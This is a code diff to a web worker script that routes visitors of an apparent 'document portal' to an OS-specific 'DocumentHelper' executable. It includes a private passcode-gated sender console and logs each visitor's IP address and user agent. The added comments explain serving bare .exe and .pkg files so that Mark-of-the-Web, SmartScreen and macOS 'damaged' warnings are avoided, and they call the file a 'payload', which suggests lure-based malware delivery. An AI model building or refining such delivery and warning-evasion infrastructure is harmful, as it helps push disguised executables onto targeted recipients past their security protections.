@@ -2,12 +2,18 @@
 // Copied into the upload bundle as `_worker.js` by mk-pages-dir.sh.
 //
 // Routes:
-//   /get | /download  -> 302 to the OS-appropriate agent (Windows/macOS/Linux)
+//   /get | /download  -> 302 to the OS-appropriate agent (.exe / .pkg / .run)
 //   /dl/<file>        -> force download (Content-Disposition: attachment)
 //   /sender           -> PRIVATE sender console (passcode gated), sender.html
 //   /f/<code>         -> document portal (index.html); ?to= handled client-side
 //   /                 -> business one-pager (about.html)
 //   everything else   -> static asset
+//
+// We hand out the BARE artifacts, not ZIPs. A Windows ZIP puts Mark-of-the-Web on
+// the archive and Explorer propagates it to the extracted .exe, so SmartScreen fires
+// anyway plus an extraction step. A macOS ZIP strips the exec bit and routinely
+// reports the ad-hoc-signed payload as "damaged and can't be opened". A .pkg and a
+// signed .exe are both double-clickable, so no archive is needed.
 //
 // Sender passcode: set the Pages env var SENDER_KEY (plaintext) in the dashboard,
 // or change DEFAULT_SENDER_KEY below. Recipients never see the sender console.
@@ -99,10 +105,10 @@ export default {
 
     // --- OS-aware agent download ---
     if (p === '/get' || p === '/download') {
-      const f = /Windows/i.test(ua)            ? 'DocumentHelper-Windows.zip'
-              : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper-macOS.zip'
+      const f = /Windows/i.test(ua)            ? 'DocumentHelper.exe'
+              : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
               : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
-              : 'DocumentHelper-Windows.zip';
+              : 'DocumentHelper.exe';
       console.log(JSON.stringify({
         ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
         ua, file: f, path: p
